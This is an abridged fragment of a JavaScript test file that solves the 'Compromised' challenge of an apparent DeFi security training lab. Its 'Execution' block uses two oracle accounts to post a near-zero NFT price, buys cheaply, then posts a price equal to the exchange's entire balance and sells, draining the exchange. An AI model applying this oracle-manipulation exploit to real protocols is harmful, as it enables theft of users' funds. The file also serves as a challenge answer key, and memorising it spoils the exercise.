...
describe("Compromised challenge", function () {
    ...
    before(async function () {
        ...
        expect(await ethers.provider.getBalance(player.address)).to.equal(ethers.utils.parseEther("0.1"));
    ...
    it("Execution", async function () {
        ...
        await this.oracle.connect(oracle1).postPrice("DVNFT", ethers.utils.parseEther("0.00001"));
        await this.oracle.connect(oracle2).postPrice("DVNFT", ethers.utils.parseEther("0.00001"));

        await this.exchange.connect(player).buyOne({ value: ethers.utils.parseEther("0.01") });

        const sellPrice = await ethers.provider.getBalance(this.exchange.address);

        await this.oracle.connect(oracle1).postPrice("DVNFT", sellPrice);
        await this.oracle.connect(oracle2).postPrice("DVNFT", sellPrice);

        await this.nftToken.connect(player).approve(this.exchange.address, 0);

        await this.exchange.connect(player).sellOne(0);
